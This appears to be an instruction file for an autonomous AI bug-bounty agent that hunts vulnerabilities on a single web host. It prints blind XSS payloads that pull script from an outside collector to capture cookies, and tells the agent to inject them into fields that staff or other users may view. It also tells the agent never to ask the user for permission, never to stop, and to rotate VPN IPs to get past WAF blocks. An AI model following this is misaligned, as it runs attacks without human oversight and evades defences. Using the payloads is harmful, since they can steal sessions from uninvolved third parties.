---
name: bug-hunting
description: Main-app focused bug hunting. Runs strictly AFTER @recon-phase has already produced recon-summary.md for the target — never runs wide recon, subdomain enum, or JS pulls itself. Pick one feature, pivot deep. Use Caido Match & Replace for UI bypass. Routes every attack class to its hunt-* knowledge skill.
---

# Bug Hunting

## PIPELINE POSITION — READ BEFORE DOING ANYTHING ELSE
This skill is stage two. Stage one is `@recon-phase`, which runs once per
new target, does the wide subdomain/URL/JS work, picks the single primary
host, and writes `recon-summary.md`. This skill never overlaps with that —
if `recon-summary.md` doesn't exist yet for the target, that's a signal
recon-phase was skipped, not a license to start enumerating here. Stop and
load `@recon-phase` first.

```
@recon-phase   → wide, one-time, produces recon-summary.md + a chosen host
      │
      ▼
@bug-hunting   → narrow, continuous (Ralph Loop), one host, feature-driven
```

Concretely, that boundary means:
- **Target selection is not this skill's job.** Read the "Primary target"
  line out of `recon-summary.md` and go — don't re-evaluate
  `important_subdomains.txt` or pick a different host mid-hunt. If the
  chosen host genuinely dries up (every feature exhausted, second pass
  done, nothing left), that's a reason to go back to `recon-phase`'s
  runner-up list for a *new* target, not a reason to start wide-recon
  logic inside this skill.
- **"Seeded leads" in `recon-summary.md` are a starting point, not a
  substitute for feature-driven testing.** Read them once at the start of
  the hunt to bias which feature/class you pivot into first. After that,
  this skill's own pivot logic (a 403 → auth bypass, a verbose error →
  injection, etc.) takes over — don't keep re-consulting the seed list
  instead of following what the app actually gives you.
- **JS analysis already happened upstream.** `recon-phase` already ran
  jxscout / grepped `jsfiles/` for endpoints, secrets, and fingerprints
  before handoff. Don't re-run that pass here. If a jxscout tmux session
  for the domain is already up from recon-phase, reuse it — only start a
  fresh one if none exists (see the JXScout section below, which now
  assumes "check first" rather than "always start").
- **No re-deriving recon's own outputs.** `all_urls.txt`,
  `vuln_patterns/*.txt`, `hosts_alive.txt` etc. are recon-phase artifacts.
  Reference them through `recon-summary.md`'s "Seeded leads" section — this
  skill reads, it doesn't regenerate.

## AUTONOMOUS MODE — DO NOT ASK THE USER
Make every decision yourself. Never ask for permission, clarification, or
confirmation. If nothing works after 10 attempts, log it to `progress.md`
(as a tested-no-finding entry) and `interesting.md` if anything about the
attempts was noteworthy, then pivot. (This is enforced globally by the
hunter orchestrator agent — restated here so this skill behaves correctly
even if loaded standalone.)

## RALPH LOOP — NEVER STOP
This is a long-running autonomous hunt. You do not stop until the process is
killed.
- Finish testing one attack class on a feature → immediately pivot to the next.
- Exhaust all classes on a feature → pick another feature.
- Exhaust all features on the current host → **start over on the same
  host**. Deeper variants, edge cases, chains. The second pass always finds
  more than the first. Check `progress.md` first — a repeat pass should
  target what's marked tested but shallow, not blindly re-run everything
  from scratch.
- Only once a genuine second pass on the current host is also exhausted
  does this stop being a "start over" situation — hand back to
  `@recon-phase`'s runner-up list for a new host, rather than inventing
  wide-recon steps in this skill.
- Never output "done," "finished," or "completed." The only terminal state is
  SIGTERM. If the process is killed and respawned mid-loop, resume from
  session state — don't treat a restart as a stopping point either.

## SPIDY SENSE — TRUST IT
Unexpected redirect, weird header, strange param name, odd error message,
timing anomaly, a response that differs slightly between users — that's your
spidy sense. **Stop and dig.** Don't move on until you understand exactly why
it happened. Most critical bugs start as "huh, that's weird." Only stop
digging once you've exhausted every angle and confirmed it's a dead end —
then log it and move on.

## Logging — Two Files, Two Purposes

Every feature/class combo you touch gets logged in exactly one of two files,
depending on what it is. Never mix the two purposes into one file — a
coverage entry and a finding entry need different shapes and different
consumers (the loop reads progress.md, the reporting flow reads
interesting.md). Neither of these is `recon-phase`'s `recon-notes.md` —
that file's decision trail (scope mode, VPN rotations, target pick) stays
where it is; don't merge it in here.

### `progress.md` — coverage tracker (check BEFORE testing)
Before starting any attack class against any feature, check `progress.md`
for that exact (feature, class) pair. If it's already logged as tested and
this isn't an explicit deeper-variant/second-pass run, skip it and pivot
elsewhere — don't burn tokens re-running an identical test. If it is a
second pass, note in the entry that it's a re-test.

Append immediately after finishing each class on a feature, regardless of
outcome:

```markdown
## <Feature/Flow>
- Tested: <class> — no finding
- Tested: <class> — no finding (2nd pass, deeper variant)
- Tested: <class> — see interesting.md#<anchor-id>
```

This file is a coverage ledger only. No evidence, no severity, no
descriptions — just "have I already hit this combo." Keep entries to one
line each so it stays fast to scan before every pivot decision.

### `interesting.md` — findings & leads (check BEFORE reporting/chaining)
Everything that isn't an immediate confirmed high-severity report goes here:
P4/P5 findings, dead ends that triggered spidy sense but went nowhere
conclusive, blind XSS injection points awaiting a callback, odd behavior
with unclear impact. **Never report a P4 or P5 finding directly — log it
here for later chaining instead.**

**P4/P5 HARD GATE (non-negotiable):** a CONFIRMED P4/P5 finding gets logged
to `interesting.md` ONLY. No report file, no `hackbot-dashboard add`, no
`hackbot-notify bug`, no findings.jsonl entry, no staging, no submission.
P4/P5 findings exist solely as chain material for a future P1-P3 report.
Only P1-P3 findings proceed to the report line.

**ALWAYS OUT OF SCOPE — NEVER TEST, NEVER REPORT (non-negotiable):**
- **Email flooding / email bombing** (mass emailing a victim address, signup/OTP/notification spam) — always out of scope. Do not test it, do not report it.
- **Missing CAPTCHA or missing/weak rate limiting** — not paying bugs. Never report a missing control on its own. Only relevant as a supporting detail in a demonstrated high-impact attack (e.g. actual ATO), never as the finding itself.
- **User enumeration without exposed data** — email/username enumeration (valid-vs-invalid differential, timing, error-message differences) is always out of scope UNLESS it exposes actual data (PII, tokens, internal info). An existence oracle alone is not a finding.

Give every entry a unique, greppable anchor ID so `progress.md` and later
validation/reporting passes can reference it directly:

```markdown
## <anchor-id> — <short title>
- Feature: <feature/flow>
- Class: <attack class>
- Severity: P4 / P5 / unclassified
- Evidence: <Caido request ID / screenshot path / curl repro>
- Chaining potential: <notes on what this might combine with>
```

Anchor ID convention: `<feature-slug>-<class-slug>-<short-suffix>`, e.g.
`reset-flow-host-header-01`. Blind XSS entries use `blind-xss-<field-slug>`
so a later `xss.report` hit can be grepped straight back to its injection
point (see `reference/oob-detection.md` if that section gets split further —
currently inline below).

Before handing anything to `@bug-validator` for a real report, check
`interesting.md` for whether the finding (or a component of a potential
chain) was already surfaced — never submit a duplicate. This file is also
the first place to look when starting a chaining pass: scan for entries
whose "chaining potential" notes overlap across features. It's also worth
checking whether `recon-phase` already logged a live secret/leak here
during its JS analysis pass — that's valid chain material too, not just
this skill's own findings.

## KNOWN FALSE POSITIVE KILLER — THE 404 BASELINE
Before probing any endpoint type, establish a soft-404 control per target.
Modern estates (SPA/Next.js/React behind a CDN) return **HTTP 200 with the
application shell for paths that don't exist** — a status code proves nothing.

```bash
for P in /zzz-nope-12345 /qqq-other-98765; do
  printf "%-20s " "$P"
  curl -sk -m 12 -o /tmp/b -w "%{http_code} %{size_download} " "$TARGET$P"
  shasum /tmp/b | cut -c1-12
done
```

Record the **status + byte length + body hash** triple — that's the control.
No endpoint is "found" until its response differs from the control. Compare
bodies, never status codes alone. Re-derive per path depth where a framework
renders different fallbacks for `/x` and `/a/b/x`.

### Marker Discipline — same anti-false-positive spirit
Any marker you inject (reflection, cache-poison, param pollution, OOB SSRF)
must be unique and unmistakable:
- 8+ random alphanumerics, no English words, no protocol keywords. NEVER
  `test`, `marker`, `evil`, `attacker`, `script`, `AAAA`, `BBBB`, your domain.
  Good: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_<random>_ZZ__`.
- Before claiming reflection, search the **baseline** (no-marker) response
  for the marker — if it appears naturally, change it. This kills ~80% of
  reflection false positives on its own.
- Sub-tag OOB callbacks (`authsrc·<collector>`, `dlcur·<collector>`) so a hit
  identifies exactly which sink fired.

## Strategy: Main App Guy
- **One target**: the host `@recon-phase` chose in `recon-summary.md`. Not
  subdomains, not staging, not api.subdomain — unless the chosen host *is*
  one of those (recon-phase picks whatever had the real attack surface,
  which is sometimes `api.` or `app.`, not always the apex). Whatever it
  picked is the one target for this entire hunt.
- **Feature-driven**: pick one feature, throw every bug class at it. IDOR
  didn't work? Try mass assignment. No? Race condition. No? JWT. The feature
  determines the attacks, not a checklist — and not the seeded-leads list
  either, past the first pivot.
- **Pivot hard**: every response is a lead. A 403 → test auth bypass. A
  verbose error → probe for injection. A user ID → test IDOR. A JWT → test
  JWT attacks.
- **Browser-driven pivots**: a UI action that reveals a new API call is a
  lead just like a 403 or a verbose error — pivot into that endpoint the
  same way.
- **No wide hunting from inside this skill**: don't run subdomain
  enumeration, don't run `gau`/`katana`/`waymore`-style URL sweeps, don't
  bulk-pull JS. That's `@recon-phase`'s job and it already happened once
  for this target. If you find yourself wanting to enumerate more surface
  than the single chosen host, that's the signal to finish the current
  host and hand back to recon-phase for the *next* target — not to start
  wide recon in the middle of a Main App Guy session.

## KNOWLEDGE LAYER — hunt-* SKILLS ARE THE PLAYBOOKS
Claude-BugHunter's `hunt-*` skills (hunt-idor, hunt-xss, hunt-ssrf, …) carry
the per-class depth: crown-jewel targets, attack-surface signals, payloads,
bypass tables, chain templates, real disclosed-report citations. **They are
the source of truth for HOW to test a class.** This skill is the orchestration
core: it decides WHEN and WITH WHAT to test, then delegates technique to the
right hunt-* skill.

Alongside the CBH hunt-* set sits a second tier of **local technique
micro-skills** — narrow, research-backed plays for specific bugs (not whole
classes): `csrf-blob-no-content-type`, `rails-json-param-juggling`,
`python-pitfalls-traversal-rce`, `sandwich-attack-token-bruteforce`,
`sso-org-hijack-unverified-email`, `nginx-middleware-misconfig`,
`apache-confusion-attacks`, `oauth-cookie-tossing-hijack`,
`oauth-mutable-claims-checklist`, `oauth-non-happy-path-ato`. Load these
with the skill tool when their trigger fires (see the "Micro-skill triggers"
table below); they layer ON TOP of the matching hunt-* skill, they don't
replace it.

> CBH's own orchestrators (`bug-bounty`, `bb-local-toolkit`, `bb-methodology`,
> `hunt-dispatch`), wide-recon/OSINT skills (`web2-recon`, `hunt-subdomain`,
> `osint-methodology`, `offensive-osint`), enterprise-infra/IR skills
> (`okta-attack`, `m365-entra-attack`, `hunt-k8s`, `hunt-cicd`, `redteam-mindset`,
> …) and web3 skills are intentionally NOT installed — out of profile (no wide
> recon here; that surface is owned by the local `@recon-phase` skill instead,
> not by CBH's wide-recon set, and not by this skill either). Orchestration is
> owned by `@recon-phase` (target selection) + this skill + the hunter agent,
> validation by @bug-validator. Installed CBH set = `hunt-*` (60) + tech-stack +
> reporting/writeup.

### Loading rules
1. **Load before you test.** The moment you commit to an attack class on a
   feature, load the matching hunt-* skill (`@hunt-idor`, `@hunt-xss`, …) via
   the skill tool. One load per class — don't hold it for later.
2. **Tech-stack skills load on fingerprint.** When a feature fingerprints as
   Next.js/Node/Laravel/Spring/ASP.NET/SharePoint/GraphQL/gRPC (from body
   markers like `__NEXT_DATA__`, `laravel_session`, headers, JS bundles),
   load the matching tech skill too — they encode the framework-specific
   bypasses that generic tests miss. Check `recon-summary.md`'s "Tech
   fingerprint" section first; recon-phase's JS analysis often already
   surfaced this, so confirm it live rather than re-discovering it cold.
3. **Don't re-read payloads here.** If a class's technique is already in the
   loaded hunt-* skill, execute it there rather than from memory.
4. **Micro-skills load on trigger, not on class.** The local technique
   micro-skills (csrf-blob, rails-json-juggling, python-pitfalls, sandwich-
   attack, sso-org-hijack, nginx/apache confusion, the three oauth-* plays)
   load when their specific trigger condition is observed — a fingerprint,
   a defense pattern, a token format — per the "Micro-skill triggers" table
   below. Load the base hunt-* skill first for the class, then layer the
   micro-skill when the trigger matches.
5. If no hunt-* skill matches a class you're testing, fall back to the
   generic classes you know and log the gap to `interesting.md`.

### Class → hunt skill → execution primitive
The primitive is THIS infra (Caido/curl/OOB). The technique is the skill's.

| Class | Load | Execution primitive (this infra) |
|---|---|---|
| IDOR | @hunt-idor | curl via proxy, swap IDs across userA/userB, diff bodies |
| Auth bypass / session | @hunt-auth-bypass, @hunt-session | curl — drop cookie, swap between users, expired/empty tokens |
| Mass assignment / API misconfig | @hunt-api-misconfig, @hunt-shadow-api | curl PATCH/PUT, extra fields (role, isAdmin, premium, featureFlags) |
| XSS (reflected/DOM/stored) | @hunt-xss, @hunt-dom | curl reflect probes + Playwright MCP render; blind → xss.report |
| SSRF | @hunt-ssrf | curl URL/webhook/image params → cloudflared tunnel OOB |
| SQLi / NoSQLi | @hunt-sqli, @hunt-nosqli | curl time/boolean markers; @batch_send for param fuzzing |
| SSTI | @hunt-ssti | curl `{{7*7}}` / `${7*7}` markers, confirm engine before RCE |
| Command injection | @hunt-rce | curl benign id/sleep markers (authorized targets only) |
| JWT | @hunt-jwt-crypto | curl — alg:none, weak secret, kid injection, role tampering |
| Race condition | @hunt-race-condition | **Caido `race_window_send`** — 5–10 concurrent, check dup processing |
| OAuth / SAML / MFA | @hunt-oauth, @hunt-saml, @hunt-mfa-bypass (+ micro-skills below) | curl + Playwright MCP (redirect_uri, state, PKCE, XSW) |
| GraphQL | @hunt-graphql | curl introspection → then @batch_send/automate for id substitution |
| File upload | @hunt-file-upload | curl multipart — extension/sniff/magic-byte bypasses |
| Deserialization | @hunt-deserialization | curl — `rO0A`, VIEWSTATE, rememberMe markers + OOB |
| Host header | @hunt-host-header | curl `-H 'Host: evil'` — reflection/cache/pw-reset poisoning |
| HTTP smuggling | @hunt-http-smuggling | Caido raw replay — CL.TE / TE.CL, timing confirm |
| Open redirect | @hunt-open-redirect | curl `-sI` — inspect Location header |
| ATO / forgot password | @hunt-ato, @hunt-forgot-password | curl flows — email change w/o re-auth, token validity |
| LFI / path traversal | @hunt-lfi | curl `../../`, `php://filter`, wrapper payloads |
| XXE | @hunt-xxe | curl XML body + cloudflared OOB |
| Business logic | @hunt-business-logic | Playwright MCP-driven state-machine + curl replays |
| Cache poisoning | @hunt-cache-poison | curl + tamper rules — unkeyed headers, then verify via Playwright MCP |
| CORS / CSRF / clickjacking | @hunt-cors, @hunt-csrf, @hunt-clickjacking | curl with spoofed Origin; Playwright MCP for the rendered impact |
| Captcha / brute force | @hunt-captcha-bypass, @hunt-brute-force | Caido automate / @batch_send with delays |
| WebSocket | @hunt-websocket | Caido WS replay — authz on frames, origin checks |
| Source/secret leak | @hunt-source-leak | jxscout + JS bundle grep — `.env`, `.js.map`, hardcoded tokens (baseline pass already done by recon-phase; this is for anything new that surfaces mid-hunt, e.g. a bundle shipped after a feature change) |
| Everything else | @hunt-misc, @hunt-html-injection, @hunt-ldap, @hunt-ntlm-info | curl + the class conventions |

### Micro-skill triggers — load the local technique skill when this fires
These sit under the class rows above (load the base hunt-* first), except
where a trigger is a pure fingerprint with no single class owner.

| Micro-skill | Load when | Pairs with class |
|---|---|---|
| `@csrf-blob-no-content-type` | Target's CSRF defense is a Content-Type check ("must be application/json"); any JSON-mutating endpoint you plan to CSRF-test | CORS / CSRF |
| `@rails-json-param-juggling` | Fingerprint is Ruby on Rails (ActionController, `laravel`-style session cookies absent, rails markers) AND endpoint accepts JSON object/array bodies — authz/mass-assignment testing | Mass assignment / auth bypass |
| `@python-pitfalls-traversal-rce` | Backend fingerprints Python (Flask/Django/gunicorn/WSGI errors) — path params, urljoin'd redirects, YAML/pickle sinks, dict-merge endpoints | LFI, SSRF, deserialization |
| `@sandwich-attack-token-bruteforce` | Security token is a UUID and the version nibble is `1` (timestamp-based, not random v4); you can mint your own tokens on demand (trigger own reset) | ATO / forgot password |
| `@sso-org-hijack-unverified-email` | B2B/multi-tenant app exposes custom/enterprise SSO (Okta/Auth0/SAML) alongside social login — org-invite / org-switch features | OAuth / SAML / ATO |
| `@oauth-cookie-tossing-hijack` | Multi-tenant or per-customer subdomains where you have JS exec (by design or XSS), AND parent-domain OAuth "connect account" flow without `__Host-` cookies | OAuth / session |
| `@oauth-mutable-claims-checklist` | "Login with Microsoft/Google/etc." present — full OAuth client audit checklist + nOAuth (mutable email claim) test | OAuth |
| `@oauth-non-happy-path-ato` | OAuth callback has an error/fallback branch (Referer-based redirect on missing params) — "dirty dancing"-style flow testing | OAuth / ATO |
| `@nginx-middleware-misconfig` | Nginx (or similar) `proxy_pass` with captured regex groups → S3/GCS/other hosts; X-Accel-Redirect, proxy_intercept_errors in play | SSRF / infra misconfig |
| `@apache-confusion-attacks` | `Server: Apache` (httpd) with RewriteRule / Files / SetHandler / CGI-family handlers visible or in scope for config review | Infra / LFI / SSRF / RCE |

> Caido MCP tools still map exactly as before: `batch_send`/`race_window_send`
> for parallel/race, `create_tamper_rule`/`toggle_tamper_rule` for Match &
> Replace, automate for fuzzing, `list_requests` HTTPQL for history. Technique
> comes from hunt-*; transport comes from here.

## WAF Blocks / IP Rotation

If requests start getting blocked by a WAF (repeated 403s, CAPTCHA
challenges, rate-limit walls that don't clear, or a sudden drop in response
variety suggesting fingerprinting) — do not keep retrying the same IP.
Rotate immediately using our local WireGuard script (the exact same tool
`@recon-phase` uses for the same reason — one rotation mechanism for the
whole pipeline):

```bash
changeip            # Next server sequentially
changeip US         # Next server in a specific country (e.g. US, JP, CA, MX)
changeip off        # Disconnect VPN entirely (internet stays up)
changeip status     # Check current IP and connection
```

- `changeip` cycles through free WireGuard configs located in `/home/aceos/Downloads/servers/`.
- Once connected, it automatically verifies the new IP and restores internet. Resume testing immediately.

### Cookie-based fallback
```bash
curl -sk -X POST "$TARGET/login" -d "username=userA&password=pass" \
  -c /tmp/userA_cookies.txt
curl -sk "$TARGET/api/resource" -b /tmp/userA_cookies.txt
curl -sk "$TARGET/api/resource" -b /tmp/userB_cookies.txt
```

## Fuzzing

### Body Integrity Warning
`edit_request` prepends `\r\n\r\n` to any body you pass, corrupting
form-urlencoded POST bodies (`\r\n\r\ndisplay_name` instead of `display_name`).
Workaround: use `curl --proxy 127.0.0.1:8080` with the exact body, or prefix
with a dummy field (`x=&real_key=value`).

### Blind fuzzing
If the target is mostly blind (no reflected output), use Caido Automate with
`create_automate_session`/`get_automate_entry` or keep the probe small and
check status/length variance — never assume a silent 200 is a pass.

- **Payloads**: `/home/aceos/Projects/payloads/coffinxp-payloads`
- **Path fuzzing**: `Pentester_wordlist.pay`
- **Parameter fuzzing via Caido Automate**: `batch_send` to fuzz a single
  endpoint — replace values, vary types, add unexpected params. threads=3,
  add request delay to avoid rate limiting.
- **If the site is too restrictive**: skip fuzzing. No point fighting WAFs —
  pivot to manual testing and tamper rules.

## OOB / Blind Detection

Two collector setups, pick based on what's being tested.

### Blind XSS — xss.report collector
Primary collector for blind XSS: `https://xss.report/c/aceos`. Use this on any input
that isn't reflected back in the immediate response — support tickets,
usernames, file names/metadata, admin-review queues, log viewers, order
notes, email templates, user-agent/referer-logged fields, anywhere a
privileged user (admin, support agent, another user) might view the value
later in a different context than where it was submitted.

Payload set (rotate through these depending on injection context — HTML
body, attribute, or a context that already breaks out of an existing tag):

```html
<!-- HTML body context -->
'"><script src=https://xss.report/c/aceos></script>

<!-- Attribute-breakout / filtered-<script> context -->
<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/aceos\';document.body.appendChild(a)')" />

<!-- Inline <script> context, no src filtering -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://xss.report/c/aceos");a.send();</script>
```

Workflow:
- Fire the payload set into every candidate field found during normal
  feature testing — don't wait for a dedicated "blind XSS pass," inject as
  you go.
- Log every field + payload variant used to `interesting.md` using the
  `blind-xss-<field-slug>` anchor convention (see Logging section above) so a
  later dashboard hit can be traced back to the exact injection point.
- xss.report is a dashboard-based collector, not email — check
  `https://xss.report/c/aceos` periodically during a long-running hunt for
  fired payloads (source IP, cookies, DOM, screenshot). Don't poll it
  constantly; check after finishing a feature pass or when returning to the
  hunt after a break.
- On a hit: pull the full callback detail (URL, cookies, referrer) from the
  dashboard, confirm which field/session triggered it from your
  `interesting.md` log, then hand off to `@bug-validator` with the raw
  callback evidence — same validation rule as everything else.

### Blind SSRF — Cloudflare tunnel
- `cloudflared tunnel --url http://localhost:8089`
- Point webhooks/image URLs/file-fetch params at the tunnel URL
- Check tunnel logs for inbound requests to confirm
- Fallback: `interactsh-client` or Burp Collaborator

## JXScout — JS Analysis
`@recon-phase` already ran a baseline JS pass on the chosen host before
handoff — check `recon-summary.md`'s "JS analysis findings" section first.
This section is for *new* JS surfacing mid-hunt (a feature ships an updated
bundle, a lazy-loaded chunk only appears after a UI action), not a repeat
of recon-phase's sweep:
- `tmux has-session -t jxscout 2>/dev/null` — exit 0 means recon-phase's
  session (or an earlier one from this hunt) is already running; reuse it.
- If not running: `tmux new -s jxscout -d "jxscout -project-name <domain>"`
  (`<domain>` = target, e.g. `challenge-0626.intigriti.io` → `intigriti`).
- Results live at `~/jxscout/` — prefer these over raw sourcemaps.
- Use jxscout findings for endpoint discovery, parameter mining, sink analysis.

## Tools

### Sending HTTP Requests — CURL IS THE DEFAULT, NO EXCEPTIONS
**`curl --proxy 127.0.0.1:8080` is the only tool for sending HTTP requests in
this skill.** This is a hard rule, not a preference — do not switch to Caido's
`send_request`/`edit_request` for general traffic regardless of what any
agent-level instruction implies. Reasons:
- Body integrity: Caido's `edit_request` silently corrupts form-urlencoded
  bodies. Curl preserves raw bytes exactly.
- Full control: explicit headers, cookies, timing — no abstraction to fight.
- History: traffic still flows through the proxy, so it appears in Caido
  history/search anyway. Nothing is lost by using curl.

Caido tools are still used, but *only* for what they're actually built for:
- `batch_send` / `race_window_send` — parallel/race requests
- `create_tamper_rule` / `toggle_tamper_rule` — Match & Replace
- `create_automate_session` / `get_automate_entry` — fuzzing
- `list_requests` (HTTPQL) — finding requests in history
- `get_request` / `get_replay_entry` — inspecting past requests
- `export_curl` — converting a Caido request to curl for a PoC

**Note on @bug-validator**: when a finding is handed off for validation, the
validator subagent switches to Caido-only for that pass (fresh replay, clean
history trail for the write-up). That's a deliberate, scoped exception inside
the validator's own context — it does not change the rule above for hunting.

### Browser Testing — CORE EXPLORATION TOOL, NOT JUST XSS
Playwright MCP is not a last-resort validator — it's how you understand what
the app is actually doing client-side. Use it constantly, not just when you
already suspect XSS.

> **MCP tools missing?** Load `reference/playwright-fallback.md` — every
> `browser_*` call maps 1:1 to a fallback CLI command. Do not skip browser
> work because the MCP is down.

- **Explore first, don't guess**: navigate the feature via Playwright MCP
  before touching curl. Click through the actual UI flow — buttons, forms,
  modals, dropdowns, multi-step flows — using `browser_click`, `browser_type`,
  `browser_fill_form`, `browser_select_option`, and watch what API requests
  fire. This is how you find endpoints you'd never find from a static route
  list. Use `browser_snapshot` to get the accessibility tree/element refs
  before interacting with anything.
- **Correlate UI action → API call**: every click, submit, toggle should be
  followed by checking `browser_network_requests` and Caido HTTP history for
  what request(s) it triggered. Build a mental (or logged) map of UI action →
  endpoint → params. This is often where the real attack surface shows up —
  hidden params, extra fields in the payload, endpoints the UI never displays
  visibly.
- **Login and session flows**: always drive login/logout/signup through
  Playwright MCP first to observe the full auth sequence (redirects, tokens
  set, cookies, any client-side session logic) before scripting it in curl.
- **Client-side logic probing**: use `browser_evaluate` to check JS-driven
  validation, disabled buttons/fields (can they be re-enabled via DOM?),
  client-side role checks, feature flags read from JS state,
  localStorage/sessionStorage contents.
- **DOM & console**: use `browser_console_messages` to inspect console
  errors/warnings, check for exposed debug info, verify DOM sinks for XSS,
  and `browser_network_requests` to watch network activity alongside Caido
  history running in parallel.
- **Confirm server-side findings client-side too**: once curl/Caido surfaces
  something (IDOR, mass assignment, etc.), reproduce it via Playwright MCP
  when it affects rendered UI — confirms real-world impact, not just a raw
  response body.
- Always run headed — you want to see what's happening, not run blind.
- Use `browser_tab_new` / `browser_tab_select` / `browser_tab_list` for
  multiple tabs **within the same account/profile** (e.g. comparing two
  pages side by side as the same user). This is NOT how you switch between
  userA and userB — that's the Chrome-profile layer in
  `reference/session-bootstrap.md` (own `--user-data-dir`, own Playwright
  MCP server instance). Tabs only split the current profile's browser
  process; they don't isolate auth.
- Before running any command, this skill assumes the Playwright MCP server
  for your account has already been launched/attached this session — see
  `reference/session-bootstrap.md`. The content here is not a substitute for
  that bootstrap step.

## Subagent Scope Inheritance
Any subagent you spawn (repo-recon, bug-validator) does NOT inherit scope
implicitly. Every delegated prompt must carry:
1. **The authorized host list, verbatim, as data** — not "the target estate"
   or "*.domain" — an explicit list. A subagent can't infer the boundary.
2. **The discovered-host rule**: hosts found mid-run (CT logs, JS bundles,
   error messages, CNAME chains) are **report-only**. Resolve DNS, record,
   hand back. Never probe or write until the operator re-authorizes — and
   never treat a discovered host as a reason to widen this skill's own
   single-target scope either; a genuinely promising discovered host is
   `@recon-phase` runner-up material for a future session, not a mid-hunt
   pivot.
3. **A deny-list of action-executing endpoints applied BEFORE any allow-list**:
   `refund`, `settle`, `payout`, `transfer`, `adjust`, `disburse`, `create`,
   `update`, `delete`, `rotate`, `reset`, `send`, `generate`, `process`.
   Only then allow read-shaped names — a path like `refund/batch/status`
   matches "status" but is a refund route.
4. **"Read-only" spelled out as forbidden verbs**, not as an adjective —
   "read-only" gets read as "don't be destructive" and an agent still creates
   a real record on prod with an empty `{}` body.

For spawning `@repo-recon` specifically (when/how, what comes back in
`priority.json`, how to use each field), load `reference/repo-recon.md`.
Note that `@repo-recon` is unrelated to `@recon-phase` — repo-recon is a
subagent for source-code recon on a specific repo, recon-phase is the
skill that runs before this one for the live web target. Don't conflate
the two when deciding whether wide recon has already happened.

## Validation Requirement
Before logging any finding as confirmed, spawn the @bug-validator subagent
with raw evidence only (Caido request IDs, screenshots) — never your own
conclusions. The subagent returns CONFIRMED, NEEDS MORE WORK, or FALSE
POSITIVE. Only that verdict counts.

Before spawning @bug-validator for anything CONFIRMED-track, check
`interesting.md` for an existing anchor on the same finding or a chain
component — never validate/report a duplicate. A CONFIRMED verdict at P4/P5
severity still does not get reported directly: log/update it in
`interesting.md` instead per the Logging section above.

## On-demand reference files — load only when triggered

This skill stays lean by keeping low-frequency, situational material out of
core context. Load these only when the trigger condition is actually true —
don't preload "just in case":

| File | Load when |
|---|---|
| `reference/session-bootstrap.md` | Start of session, or before any Playwright MCP call — claiming an account slot, profile layout, release/switch-account mechanics |
| `reference/accounts-registration.md` | You're about to register a new test account (email pattern, phone/SMS OTP, creds-file writing) |
| `reference/captcha-solving.md` | A CAPTCHA actually appears on screen — the 4 MCP calls, decision logic, worked examples |
| `reference/playwright-fallback.md` | Playwright MCP tools are missing from your toolset or the connection errors — command mapping + non-negotiable rules |
| `reference/repo-recon.md` | You're about to spawn `@repo-recon` — when/how to spawn, `priority.json` shape, how to use each field |

Two accounts (userA/userB) are always required for IDOR-style cross-checks —
that requirement lives in `reference/accounts-registration.md` since it's
entangled with the registration workflow, not because it's optional.
